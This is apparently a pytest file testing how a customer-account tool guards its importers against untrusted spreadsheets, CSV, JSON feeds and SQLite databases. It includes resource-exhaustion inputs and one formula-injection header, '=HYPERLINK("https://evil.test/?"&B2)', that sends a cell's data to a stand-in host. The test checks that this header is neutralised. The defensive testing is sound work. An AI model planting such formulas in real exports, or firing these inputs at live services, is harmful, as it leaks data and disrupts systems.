"""Parsing of untrusted files and data: the limits on columns, cells and rows, linear header
handling, the paginated JSON API caps, the SQLite deadline, the date and delimiter guards, the
formula-safe header row and the account text lengths.

Each hostile input is a small version of the one a reviewer sent. Timing checks use a generous
bound: the fixed code finishes these in well under a second.
"""

from __future__ import annotations

import csv
import io
import json
import sqlite3
import time
import zipfile
from datetime import date, datetime
from pathlib import Path

import httpx
import pytest
from openpyxl import Workbook

from cs_brief.core import importing
from cs_brief.core.feeds import http as feed_http
from cs_brief.core.feeds import sync
from cs_brief.core.feeds.http import FeedError
from cs_brief.core.feeds.providers import base, files, web
from cs_brief.core.importing import CELL_TOO_LONG_MESSAGE, DateOrder, ImportError_

QUICK = 10.0  # seconds: a generous bound for a hostile input that must not hang
API = "https://api.example.test/v1/accounts"


def _xlsx(cells: dict[str, object]) -> bytes:
    workbook = Workbook()
    sheet = workbook.active
    for reference, value in cells.items():
        sheet[reference] = value
    buffer = io.BytesIO()
    workbook.save(buffer)
    return buffer.getvalue()


def _xlsx_with_text(text: str) -> bytes:
    """An .xlsx whose A2 holds `text`. openpyxl cuts a value to 32,767 characters when it is set,
    so a placeholder is swapped for the text in the saved sheet XML instead."""
    workbook = Workbook()
    sheet = workbook.active
    sheet["A1"] = "name"
    sheet["A2"] = "placeholder"
    buffer = io.BytesIO()
    workbook.save(buffer)
    source = zipfile.ZipFile(io.BytesIO(buffer.getvalue()))
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as target:
        for info in source.infolist():
            data = source.read(info.filename)
            if info.filename == "xl/worksheets/sheet1.xml":
                data = data.replace(b"placeholder", text.encode("utf-8"))
            target.writestr(info.filename, data)
    return out.getvalue()


def _reference_unique(cells: list[str]) -> list[str]:
    """The original quadratic header rule, kept here to check the linear one against."""
    used: set[str] = set()
    headers: list[str] = []
    for position, cell in enumerate(cells, start=1):
        base_name = cell or f"Column {position}"
        name = base_name
        if name in used:
            copy = 2
            while f"{base_name} ({copy})" in used:
                copy += 1
            name = f"{base_name} ({copy})"
        used.add(name)
        headers.append(name)
    return headers


# Spreadsheet imports -------------------------------------------------------------------------


def test_a_sparse_xlsx_with_a_far_cell_is_read_quickly() -> None:
    data = _xlsx({"A1": "name", "A2": "acme", "XFD1048576": "z"})
    started = time.perf_counter()
    table = importing.read_upload(data, "far.xlsx")
    assert time.perf_counter() - started < QUICK
    assert table.headers == ["name"]
    assert table.rows == [["acme"]]


def test_an_xlsx_cell_longer_than_a_spreadsheet_allows_is_refused() -> None:
    data = _xlsx_with_text("x" * 40_000)
    started = time.perf_counter()
    with pytest.raises(ImportError_, match="longer than a spreadsheet allows") as caught:
        importing.read_upload(data, "long.xlsx")
    assert time.perf_counter() - started < QUICK
    assert str(caught.value) == CELL_TOO_LONG_MESSAGE
    assert "xxxxxxxx" not in str(caught.value)


def test_an_xlsx_cell_of_exactly_the_spreadsheet_limit_is_read() -> None:
    table = importing.read_upload(_xlsx_with_text("x" * 32_767), "limit.xlsx")
    assert len(table.rows[0][0]) == 32_767


def test_an_xlsx_with_text_in_the_501st_column_is_refused() -> None:
    started = time.perf_counter()
    with pytest.raises(ImportError_, match="more than 500 columns"):
        importing.read_xlsx(_xlsx_wide(501), "wide.xlsx")
    assert time.perf_counter() - started < QUICK


def _xlsx_wide(columns: int) -> bytes:
    workbook = Workbook()
    sheet = workbook.active
    for column in range(1, columns + 1):
        sheet.cell(row=1, column=column, value=f"c{column}")
    sheet.cell(row=2, column=columns, value="x")
    buffer = io.BytesIO()
    workbook.save(buffer)
    return buffer.getvalue()


def test_an_xlsx_with_500_columns_is_read() -> None:
    table = importing.read_xlsx(_xlsx_wide(500), "wide.xlsx")
    assert len(table.headers) == 500


def test_an_xlsx_past_the_row_limit_is_refused() -> None:
    workbook = Workbook()
    sheet = workbook.active
    sheet.append(["name"])
    for number in range(importing.MAX_ROWS + 1):
        sheet.append([f"acme {number}"])
    buffer = io.BytesIO()
    workbook.save(buffer)
    with pytest.raises(ImportError_, match="more than 5,000 rows"):
        importing.read_xlsx(buffer.getvalue(), "many.xlsx")


def test_an_xlsx_that_unpacks_to_more_than_the_total_is_refused(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(importing, "MAX_XLSX_UNCOMPRESSED", 1_000)
    with pytest.raises(ImportError_) as caught:
        importing.read_upload(_xlsx_with_text("x" * 2_000), "big.xlsx")
    assert str(caught.value) == "That workbook is too large once unpacked."


def test_an_xlsx_with_one_part_over_the_member_limit_is_refused(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(importing, "MAX_XLSX_MEMBER", 1_000)
    with pytest.raises(ImportError_, match="too large once unpacked"):
        importing.read_upload(_xlsx_with_text("x" * 2_000), "big.xlsx")


def test_a_damaged_zip_with_the_xlsx_signature_is_the_damaged_workbook_error() -> None:
    with pytest.raises(ImportError_, match="isn't a readable Excel file"):
        importing.read_upload(b"PK\x03\x04" + b"not really a zip " * 40, "damaged.xlsx")


def test_an_xlsx_of_normal_size_is_read_under_the_default_limits() -> None:
    table = importing.read_upload(_xlsx_with_text("acme"), "small.xlsx")
    assert table.rows == [["acme"]]


# Delimited text ------------------------------------------------------------------------------


def test_a_header_with_20000_repeats_is_refused_quickly() -> None:
    text = ",".join(["a"] * 20_000) + "\nx\n"
    started = time.perf_counter()
    with pytest.raises(ImportError_, match="more than 500 columns"):
        importing.read_csv(text.encode("utf-8"), "wide.csv")
    assert time.perf_counter() - started < QUICK


def test_400_repeats_of_a_header_are_unique_and_quick() -> None:
    text = ",".join(["a"] * 400) + "\n" + ",".join(["x"] * 400) + "\n"
    started = time.perf_counter()
    table = importing.read_csv(text.encode("utf-8"), "repeats.csv")
    assert time.perf_counter() - started < QUICK
    assert table.headers == ["a", *(f"a ({copy})" for copy in range(2, 401))]
    assert len(table.rows) == 1


def test_a_header_followed_by_400000_blank_columns_reads_its_rows() -> None:
    text = "a" + "," * 400_000 + "\n" + "x\n" * 2_000
    started = time.perf_counter()
    table = importing.read_csv(text.encode("utf-8"), "blank.csv")
    assert time.perf_counter() - started < QUICK
    assert table.headers == ["a"]
    assert table.rows == [["x"]] * 2_000


def test_500_distinct_headers_are_read_and_501_are_refused() -> None:
    names = [f"c{number}" for number in range(501)]
    ok = ",".join(names[:500]) + "\n" + ",".join(["1"] * 500) + "\n"
    assert len(importing.read_csv(ok.encode("utf-8"), "ok.csv").headers) == 500
    too_wide = ",".join(names) + "\n" + ",".join(["1"] * 501) + "\n"
    with pytest.raises(ImportError_, match="That has more than 500 columns"):
        importing.read_csv(too_wide.encode("utf-8"), "wide.csv")


def test_a_data_row_wider_than_the_header_is_cut_as_before() -> None:
    text = "name,arr\nacme,1,extra\n"
    table = importing.read_csv(text.encode("utf-8"), "cut.csv")
    assert table.headers == ["name", "arr"]
    assert table.rows == [["acme", "1"]]


def test_five_megabytes_of_newlines_finish_quickly() -> None:
    data = b"a\n" + b"\n" * (5 * 1024 * 1024 - 3)
    started = time.perf_counter()
    table = importing.read_csv(data, "newlines.csv")
    assert time.perf_counter() - started < QUICK
    assert table.headers == ["a"]
    assert table.rows == []


def test_a_csv_past_the_row_limit_stops_reading_early() -> None:
    data = b"a\n" + b"x\n" * 2_500_000  # 5 MB of rows: refused without reading them all
    started = time.perf_counter()
    with pytest.raises(ImportError_, match="more than 5,000 rows"):
        importing.read_csv(data, "many.csv")
    assert time.perf_counter() - started < QUICK


def test_a_csv_cell_longer_than_a_spreadsheet_allows_is_refused() -> None:
    data = ("a\n" + "x" * 40_000 + "\n").encode("utf-8")
    with pytest.raises(ImportError_) as caught:
        importing.read_csv(data, "long.csv")
    assert str(caught.value) == CELL_TOO_LONG_MESSAGE


def test_a_pasted_cell_longer_than_a_spreadsheet_allows_is_refused() -> None:
    with pytest.raises(ImportError_, match="longer than a spreadsheet allows"):
        importing.read_pasted("name\n" + "x" * 40_000)


def test_the_unique_header_rule_matches_the_original_on_repeats() -> None:
    cells = ["a", "a", "a (2)", "a", "", "Column 5", "Column 5", "a", "b", "b (2)", "b"]
    assert importing._unique_headers(cells) == _reference_unique(cells)
    assert importing._unique_headers(["a", "a", "a", "a"]) == [
        "a",
        "a (2)",
        "a (3)",
        "a (4)",
    ]


@pytest.mark.parametrize(
    "text",
    [
        "a;b;c\n1;2;3\n",
        "a|b\r1|2\r3|4\r",
        "a\tb\r\n1\t2\r\n",
        "a,b\x0b1,2\x0c3,4\x1c5,6\x85",
        "a;b\u20281;2\u2029",
        "\n\n\na;b\n" * 30,
        "x" + "\n" * 60 + "a|b|c\n1|2|3\n",
        "no newline at all, just words",
        "",
    ],
)
def test_the_delimiter_sample_is_cut_the_way_splitlines_cuts_it(
    text: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    seen: list[str] = []

    class CapturingSniffer:
        def sniff(self, sample: str, delimiters: str) -> None:
            seen.append(sample)
            raise csv.Error("captured")

    monkeypatch.setattr(importing.csv, "Sniffer", CapturingSniffer)
    assert importing._sniff_delimiter(text) == ","
    assert seen == ["\n".join(text.splitlines()[:50])]


# Records from JSON -----------------------------------------------------------------------------


def test_records_with_600_distinct_keys_are_refused() -> None:
    record = {f"k{number}": 1 for number in range(600)}
    with pytest.raises(FeedError, match="That has more than 500 columns"):
        base.records_to_table([record], "wide")


def test_a_record_cell_longer_than_a_spreadsheet_allows_is_refused() -> None:
    with pytest.raises(FeedError, match="longer than a spreadsheet allows"):
        base.records_to_table([{"name": "x" * 40_000}], "long")


def test_a_deeply_nested_record_flattens_without_recursion() -> None:
    depth = 5_000
    value: object = 1
    for _ in range(depth):
        value = {"a": value}
    assert base._flatten(value) == {".".join(["a"] * depth): "1"}


def test_json_nested_too_deeply_is_a_plain_error(monkeypatch: pytest.MonkeyPatch) -> None:
    body = ("[" * 5_000 + "]" * 5_000).encode("utf-8")
    _serve(monkeypatch, lambda request: httpx.Response(200, content=body))
    with pytest.raises(FeedError) as caught:
        sync.fetch_with("json_api", {"url": API, "records_path": ""}, None)
    assert caught.value.message == "That JSON is nested too deeply."


def test_a_deeply_nested_object_is_a_plain_error(monkeypatch: pytest.MonkeyPatch) -> None:
    body = ('{"data": [' + '{"a":' * 5_000 + "1" + "}" * 5_000 + "]}").encode("utf-8")
    _serve(monkeypatch, lambda request: httpx.Response(200, content=body))
    with pytest.raises(FeedError, match="nested too deeply"):
        sync.fetch_with("json_api", {"url": API, "records_path": "data"}, None)


def test_a_provider_reading_json_with_get_json_gets_the_nesting_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    body = ("[" * 5_000 + "]" * 5_000).encode("utf-8")
    _serve(
        monkeypatch,
        lambda request: httpx.Response(
            200, content=body, headers={"content-type": "application/json"}
        ),
    )
    with pytest.raises(FeedError) as caught:
        sync.fetch_with("stripe", {}, "test-secret-0123456789abcdef")
    assert caught.value.message == "That JSON is nested too deeply."


# Paginated JSON API ----------------------------------------------------------------------------


def _serve(monkeypatch: pytest.MonkeyPatch, handler) -> list[httpx.Request]:
    seen: list[httpx.Request] = []

    def answer(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return handler(request)

    monkeypatch.setattr(feed_http, "transport_factory", lambda: httpx.MockTransport(answer))
    return seen


def _page(request: httpx.Request, rows: list[object]) -> httpx.Response:
    """One page of rows whose next link is the following page number."""
    number = int(request.url.params.get("page", "1"))
    body = {"data": rows, "next": f"{API}?page={number + 1}"}
    return httpx.Response(
        200, content=json.dumps(body).encode("utf-8"), headers={"content-type": "application/json"}
    )


_PAGED = {"url": API, "records_path": "data", "next_path": "next"}


def test_a_paginated_source_past_the_row_limit_is_refused_after_the_page_that_passes_it(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    seen = _serve(monkeypatch, lambda request: _page(request, [{}] * 30_000))
    with pytest.raises(FeedError) as caught:
        sync.fetch_with("json_api", dict(_PAGED), None)
    assert caught.value.message == "That source has more than 50,000 rows."
    assert len(seen) == 2


def test_pages_whose_bodies_add_up_past_the_total_are_refused(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(web, "MAX_TOTAL_BYTES", 1_000)
    seen = _serve(monkeypatch, lambda request: _page(request, [{"name": "x" * 400}]))
    with pytest.raises(FeedError, match="sent more than 0 MB in total"):
        sync.fetch_with("json_api", dict(_PAGED), None)
    assert len(seen) == 3


def test_the_total_byte_cap_is_100_million_bytes() -> None:
    assert base.MAX_TOTAL_BYTES == 100_000_000


# SQLite --------------------------------------------------------------------------------------


def _database(tmp_path: Path, statements: list[str]) -> Path:
    path = tmp_path / "hostile.db"
    connection = sqlite3.connect(path)
    for statement in statements:
        connection.execute(statement)
    connection.commit()
    connection.close()
    return path


def test_a_query_that_never_ends_is_stopped_at_the_deadline(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(files, "SQLITE_SECONDS", 0.5)
    path = _database(tmp_path, ["CREATE TABLE accounts (name TEXT)"])
    query = (
        "SELECT count(*) FROM "
        "(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x + 1 FROM c) SELECT x FROM c)"
    )
    started = time.perf_counter()
    with pytest.raises(FeedError) as caught:
        sync.fetch_with("sqlite", {"path": str(path), "query": query}, None)
    assert time.perf_counter() - started < QUICK
    assert caught.value.message == ("That query took longer than 0.5 seconds. Make it simpler.")


def test_a_view_returning_a_40000_character_string_is_refused(tmp_path: Path) -> None:
    connection = sqlite3.connect(tmp_path / "long.db")
    connection.execute("CREATE TABLE notes (body TEXT)")
    connection.execute("INSERT INTO notes VALUES (?)", ("x" * 40_000,))
    connection.execute("CREATE VIEW long_notes AS SELECT body FROM notes")
    connection.commit()
    connection.close()
    with pytest.raises(FeedError) as caught:
        sync.fetch_with(
            "sqlite",
            {"path": str(tmp_path / "long.db"), "query": "SELECT body FROM long_notes"},
            None,
        )
    assert caught.value.message == CELL_TOO_LONG_MESSAGE


def test_a_value_far_past_the_cell_limit_fails_inside_sqlite(tmp_path: Path) -> None:
    path = _database(tmp_path, ["CREATE VIEW huge AS SELECT zeroblob(500000000) AS payload"])
    started = time.perf_counter()
    with pytest.raises(FeedError) as caught:
        sync.fetch_with("sqlite", {"path": str(path), "query": "SELECT payload FROM huge"}, None)
    assert time.perf_counter() - started < QUICK
    assert caught.value.message == CELL_TOO_LONG_MESSAGE


def test_a_query_returning_600_columns_is_refused(tmp_path: Path) -> None:
    columns = ", ".join(f"c{number}" for number in range(600))
    path = _database(tmp_path, [f"CREATE TABLE wide ({columns})"])
    with pytest.raises(FeedError) as caught:
        sync.fetch_with("sqlite", {"path": str(path), "query": "SELECT * FROM wide"}, None)
    assert (
        caught.value.message
        == "That has more than 500 columns. Remove the ones cs-brief doesn't need."
    )


# Dates and the sniffer -----------------------------------------------------------------------


def test_a_long_run_of_spaces_is_not_a_date_and_returns_quickly() -> None:
    started = time.perf_counter()
    with pytest.raises(ValueError, match="isn't a date"):
        importing.parse_date("a" + " " * 40_000 + "a", DateOrder.DMY)
    assert time.perf_counter() - started < QUICK


def test_detecting_the_date_order_of_a_long_run_of_spaces_is_quick() -> None:
    started = time.perf_counter()
    assert importing.detect_date_order(["1" + " " * 40_000 + "x"]) is None
    assert time.perf_counter() - started < QUICK


def test_a_normal_date_with_a_time_still_parses() -> None:
    assert importing.parse_date("2026-12-01 10:30:00", DateOrder.DMY) == date(2026, 12, 1)


# Formula-safe problem rows ---------------------------------------------------------------------


def test_the_problem_rows_header_is_formula_safe() -> None:
    header = '=HYPERLINK("https://evil.test/?"&B2)'
    text = f'Account name,ARR,"{header.replace(chr(34), chr(34) * 2)}"\nAcme,$10,x\n'
    table = importing.read_csv(text.encode("utf-8"), "book.csv")
    assert table.headers[2] == header
    issues = [importing.ImportIssue(row=2, field=None, message="Check it.")]
    rows = list(csv.reader(io.StringIO(importing.issues_csv(table, issues))))
    assert rows[0][2] == "'" + header
    assert rows[0][3] == "Problems"


# Account text lengths --------------------------------------------------------------------------


def _build(text: str):
    table = importing.read_csv(text.encode("utf-8"), "book.csv")
    mapping = importing.auto_map(table.headers)
    return importing.build_import(
        table,
        mapping,
        connection_id="sheet-1",
        date_order=DateOrder.YMD,
        imported_at=datetime(2026, 1, 1),
        today=date(2026, 1, 1),
    )


def test_an_account_name_longer_than_200_characters_skips_its_row() -> None:
    result = _build(
        f"Account name,ARR,Renewal date\n{'A' * 201},$1,2026-01-01\nBeta,$2,2026-01-01\n"
    )
    assert [account.name for account in result.accounts] == ["Beta"]
    assert result.skipped_rows == 1
    assert [(issue.row, issue.message) for issue in result.issues] == [
        (2, "Account name is longer than 200 characters.")
    ]


@pytest.mark.parametrize(
    ("label", "key", "default"), [("Owner", "owner", "Unassigned"), ("Tier", "tier", "Unknown")]
)
def test_an_owner_or_tier_longer_than_200_characters_drops_the_value_and_keeps_the_row(
    label: str, key: str, default: str
) -> None:
    result = _build(
        f"Account name,ARR,Renewal date,{label}\n"
        f"Acme,$1,2026-01-01,{'B' * 201}\n"
        "Beta,$2,2026-01-01,Sam\n"
    )
    assert [account.name for account in result.accounts] == ["Acme", "Beta"]
    assert result.skipped_rows == 0
    assert getattr(result.accounts[0], key) == default
    assert [(issue.row, issue.field, issue.message) for issue in result.issues] == [
        (2, key, f"{label} is longer than 200 characters.")
    ]


def test_a_text_field_of_exactly_200_characters_is_kept() -> None:
    result = _build(f"Account name,ARR,Renewal date,Owner\nAcme,$1,2026-01-01,{'B' * 200}\n")
    assert [account.name for account in result.accounts] == ["Acme"]
    assert result.issues == []
